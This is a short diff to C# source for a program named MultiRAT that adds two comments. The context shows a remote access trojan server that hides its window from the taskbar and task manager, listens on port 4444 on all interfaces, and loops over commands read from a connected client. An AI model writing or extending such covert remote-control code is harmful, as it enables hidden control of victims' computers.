@@ -25,7 +25,7 @@ namespace MultiRAT
 
         private void Form1_Shown(object sender, EventArgs e)
         {
-            this.Hide();
+            this.Hide(); // Hides from taskbar and taskmanager
             tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
             tcpListener.Start();
             RunServer();
@@ -38,6 +38,7 @@ namespace MultiRAT
             streamReader = new StreamReader(networkStream);
             try
             {
+                // Stores the message that the client sends to the server
                 string line;
                 // Command loop, LastOndexOf is for searching within the
                 // network stream for command strings sent by the client
